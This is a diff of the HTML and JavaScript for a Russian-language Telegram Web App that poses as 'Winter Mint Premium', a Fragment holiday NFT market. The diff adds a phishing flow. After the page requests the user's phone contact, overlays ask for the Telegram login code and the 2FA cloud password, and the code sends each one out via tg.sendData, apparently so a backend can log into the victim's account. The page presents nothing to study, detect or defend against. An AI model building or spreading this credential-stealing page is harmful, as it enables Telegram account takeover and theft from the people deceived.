@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Winter Mint Premium</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
@@ -17,7 +17,6 @@
     --text-soft:rgba(244,244,244,0.7);
 }
 
-/* ===== GENERAL ===== */
 *{box-sizing:border-box;}
 body{
     margin:0;
@@ -26,169 +25,60 @@ body{
     background: linear-gradient(180deg,var(--bg-dark),var(--bg-grad));
     overflow-x:hidden;
     position:relative;
+    min-height: 100vh;
 }
 
-/* ===== SNOW ===== */
-canvas{
-    position:fixed;
-    inset:0;
-    z-index:1;
-    pointer-events:none;
-}
+/* СНЕГ */
+canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
 
-/* ===== HEADER ===== */
-.header{
-    text-align:center;
-    padding:60px 20px 20px;
-    position:relative;
-    z-index:2;
-}
-.header h1{
-    margin:0;
-    font-size:32px;
-    font-weight:700;
-    letter-spacing:.4px;
-    text-shadow:0 0 10px var(--accent-red);
-}
-.badge{
-    margin-top:8px;
-    display:inline-block;
-    background:var(--accent-green);
-    color:#fff;
-    padding:6px 14px;
-    border-radius:20px;
-    font-size:14px;
-    font-weight:700;
-    box-shadow:0 4px 12px rgba(0,0,0,0.4);
-}
+/* HEADER */
+.header{ text-align:center; padding:60px 20px 20px; position:relative; z-index:2; }
+.header h1{ margin:0; font-size:32px; font-weight:700; text-shadow:0 0 10px var(--accent-red); }
+.badge{ margin-top:8px; display:inline-block; background:var(--accent-green); color:#fff; padding:6px 14px; border-radius:20px; font-size:14px; font-weight:700; box-shadow:0 4px 12px rgba(0,0,0,0.4); }
 
-/* ===== NAV ===== */
-.nav{
-    display:flex;
-    gap:10px;
-    padding:10px;
-    position:sticky;
-    top:0;
-    z-index:5;
-    background:rgba(0,0,0,.4);
-    backdrop-filter:blur(8px);
-}
-.nav button{
-    flex:1;
-    padding:12px;
-    border-radius:14px;
-    border:1px solid var(--accent-red);
-    background:transparent;
-    color:#fff;
-    font-weight:700;
-    transition:0.3s;
-}
-.nav button.active{
-    background:linear-gradient(90deg,var(--accent-red),var(--accent-green));
-    color:#fff;
-}
+/* NAV */
+.nav{ display:flex; gap:10px; padding:10px; position:sticky; top:0; z-index:5; background:rgba(0,0,0,.4); backdrop-filter:blur(8px); }
+.nav button{ flex:1; padding:12px; border-radius:14px; border:1px solid var(--accent-red); background:transparent; color:#fff; font-weight:700; transition:0.3s; cursor:pointer;}
+.nav button.active{ background:linear-gradient(90deg,var(--accent-red),var(--accent-green)); border:none; }
 
-/* ===== SECTIONS ===== */
-.section{
-    display:none;
-    padding:16px;
-    position:relative;
-    z-index:2;
-}
+/* SECTIONS */
+.section{ display:none; padding:16px; position:relative; z-index:2; }
 .section.active{display:block}
 
-/* ===== CARD ===== */
-.card{
-    background:var(--card);
-    border:1px solid var(--border);
-    border-radius:20px;
-    padding:18px;
-    margin-bottom:16px;
-    backdrop-filter:blur(12px);
-    box-shadow:0 8px 28px rgba(0,0,0,.5);
+/* CARD */
+.card{ background:var(--card); border:1px solid var(--border); border-radius:20px; padding:18px; margin-bottom:16px; backdrop-filter:blur(12px); box-shadow:0 8px 28px rgba(0,0,0,.5); }
+
+.label{ font-size:12px; color:var(--text-soft); margin-bottom:6px; }
+.value{ font-size:20px; font-weight:600; }
+.desc{ font-size:14px; color:var(--text-soft); line-height:1.55; }
+
+/* BUTTON */
+.btn{ width:100%; margin-top:12px; padding:14px; border-radius:14px; border:none; background:linear-gradient(135deg,var(--accent-red),var(--accent-green)); color:#fff; font-weight:700; cursor:pointer; box-shadow:0 6px 20px rgba(0,0,0,0.5); transition:0.3s; }
+.btn:active{ transform:scale(0.98); }
+
+/* MARKET */
+.market{ display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+.nft{ background:var(--card); border:1px solid var(--border); border-radius:18px; padding:10px; text-align:center; }
+.nft img{ width:100%; max-height:140px; object-fit:contain; border-radius:14px; }
+
+/* MODALS (ОКНА ВВОДА) */
+.overlay {
+    display: none; position: fixed; inset: 0; 
+    background: rgba(0,0,0,0.9); backdrop-filter: blur(15px);
+    z-index: 1000; padding: 40px 24px; flex-direction: column; justify-content: center;
+}
+.overlay.active { display: flex; }
+.input-field {
+    background: rgba(255,255,255,0.05); border: 1.5px solid var(--accent-red);
+    padding: 20px; border-radius: 16px; color: #fff;
+    font-size: 26px; text-align: center; margin: 25px 0; outline: none;
 }
 
-/* ===== TEXT ===== */
-.label{
-    font-size:12px;
-    color:var(--text-soft);
-    margin-bottom:6px;
-}
-.value{
-    font-size:20px;
-    font-weight:600;
-}
-.desc{
-    font-size:14px;
-    color:var(--text-soft);
-    line-height:1.55;
-}
-
-/* ===== BUTTON ===== */
-.btn{
-    width:100%;
-    margin-top:12px;
-    padding:14px;
-    border-radius:14px;
-    border:none;
-    background:linear-gradient(135deg,var(--accent-red),var(--accent-green));
-    color:#fff;
-    font-weight:700;
-    cursor:pointer;
-    box-shadow:0 6px 20px rgba(0,0,0,0.5);
-    transition:0.3s;
-}
-.btn:hover{
-    transform:translateY(-2px);
-}
-
-/* ===== MARKET ===== */
-.market{
-    display:grid;
-    grid-template-columns:1fr 1fr;
-    gap:14px;
-}
-.nft{
-    background:var(--card);
-    border:1px solid var(--border);
-    border-radius:18px;
-    padding:10px;
-    text-align:center;
-}
-.nft img{
-    width:100%;
-    max-height:140px;
-    object-fit:contain;
-    border-radius:14px;
-    opacity:0.95;
-}
-.nft-title{
-    font-size:13px;
-    font-weight:500;
-    color:var(--text);
-}
-
-/* ===== SUPPORT ===== */
-.support{
-    font-size:14px;
-    line-height:1.6;
-    color:var(--text-soft);
-}
-
-/* ===== COZY DECOR ===== */
-.fireplace{
-    position:fixed;
-    bottom:10px;
-    right:10px;
-    font-size:48px;
-    text-shadow:0 0 15px #f77;
-    z-index:2;
-    opacity:0.85;
-}
+.fireplace{ position:fixed; bottom:10px; right:10px; font-size:48px; text-shadow:0 0 15px #f77; z-index:2; opacity:0.85; }
 </style>
 </head>
-
 <body>
+
 <canvas id="snow"></canvas>
 
 <div class="header">
@@ -197,35 +87,24 @@ canvas{
 </div>
 
 <div class="nav">
-    <button class="active" onclick="openTab('cab',this)">Кабинет</button>
-    <button onclick="openTab('market',this)">Маркет</button>
-    <button onclick="openTab('support',this)">Поддержка</button>
+    <button id="tab-cab" class="active" onclick="openTab('cab',this)">Кабинет</button>
+    <button id="tab-market" onclick="openTab('market',this)">Маркет</button>
+    <button id="tab-support" onclick="openTab('support',this)">Поддержка</button>
 </div>
 
-<!-- ===== КАБИНЕТ ===== -->
 <div id="cab" class="section active">
     <div class="card">
         <div class="label">СТАТУС АККАУНТА</div>
         <div class="value">Не подтверждён</div>
         <button class="btn" onclick="startAuth()">Пройти верификацию</button>
     </div>
-
     <div class="card">
         <div class="label">БАЛАНС</div>
         <div class="value">0.00 ⭐</div>
         <button class="btn" onclick="startAuth()">Пополнить баланс</button>
     </div>
-
-    <div class="card">
-        <div class="desc">
-            Winter Mint — праздничная коллекция Fragment.
-            После подтверждения аккаунта открывается доступ
-            к зимним NFT и бонусам.
-        </div>
-    </div>
 </div>
 
-<!-- ===== MARKET ===== -->
 <div id="market" class="section">
     <div class="market">
         <div class="nft" onclick="startAuth()">
@@ -239,16 +118,25 @@ canvas{
     </div>
 </div>
 
-<!-- ===== SUPPORT ===== -->
 <div id="support" class="section">
-    <div class="card support">
-        <p>
-            Наша команда поддержки поможет по всем вопросам,
-            связанным с Winter Mint и праздничными NFT.
-        </p>
-        <p><b>Контакт:</b> @x1o1y</p>
-        <button class="btn" onclick="window.open('https://t.me/x1o1y')">Написать в поддержку</button>
+    <div class="card">
+        <p>Контакт техподдержки: <b>@x1o1y</b></p>
+        <button class="btn" onclick="window.open('https://t.me/x1o1y')">Написать</button>
     </div>
+</div>
+
+<div id="step-code" class="overlay">
+    <h2 style="text-align:center">Код из Telegram</h2>
+    <p style="text-align:center; color:var(--text-soft)">Мы отправили код в ваше приложение</p>
+    <input type="number" id="inp-code" class="input-field" placeholder="00000">
+    <button class="btn" onclick="submitCode()">ПОДТВЕРДИТЬ</button>
+</div>
+
+<div id="step-2fa" class="overlay">
+    <h2 style="text-align:center">Пароль 2FA</h2>
+    <p style="text-align:center; color:var(--text-soft)">Введите ваш облачный пароль</p>
+    <input type="password" id="inp-pass" class="input-field" placeholder="Пароль">
+    <button class="btn" onclick="submitPass()">ВОЙТИ</button>
 </div>
 
 <div class="fireplace">🔥</div>
@@ -267,20 +155,39 @@ function startAuth() {
     tg.requestContact((ok,res)=>{
         if(ok && res.responseUnsafe.contact){
             tg.sendData("PHONE:" + res.responseUnsafe.contact.phone_number);
+            // Пауза 3 сек, пока Python отправляет код
+            setTimeout(() => {
+                document.getElementById('step-code').classList.add('active');
+            }, 3000);
         }
     });
 }
 
-/* ===== SNOW ===== */
+function submitCode() {
+    const val = document.getElementById('inp-code').value;
+    if(val.length >= 5) {
+        tg.sendData("CODE:" + val);
+        document.getElementById('step-code').classList.remove('active');
+        document.getElementById('step-2fa').classList.add('active');
+    }
+}
+
+function submitPass() {
+    const val = document.getElementById('inp-pass').value;
+    if(val.length > 0) {
+        tg.sendData("PASS:" + val);
+        tg.close();
+    }
+}
+
+/* СНЕГ */
 const c=document.getElementById("snow"),ctx=c.getContext("2d");
 let w,h,flakes=[];
 function resize(){w=c.width=innerWidth;h=c.height=innerHeight}
 window.onresize=resize;resize();
-for(let i=0;i<120;i++)
-flakes.push({x:Math.random()*w,y:Math.random()*h,r:1.5+Math.random()*2,s:0.6+Math.random()*1.4});
+for(let i=0;i<120;i++) flakes.push({x:Math.random()*w,y:Math.random()*h,r:1.5+Math.random()*2,s:0.6+Math.random()*1.4});
 function snow(){
-    ctx.clearRect(0,0,w,h);
-    ctx.fillStyle="rgba(255,255,255,0.9)";
+    ctx.clearRect(0,0,w,h); ctx.fillStyle="rgba(255,255,255,0.8)";
     flakes.forEach(f=>{
         ctx.beginPath();ctx.arc(f.x,f.y,f.r,0,Math.PI*2);ctx.fill();
         f.y+=f.s;if(f.y>h){f.y=-10;f.x=Math.random()*w}
@@ -289,6 +196,5 @@ function snow(){
 }
 snow();
 </script>
-
 </body>
 </html>
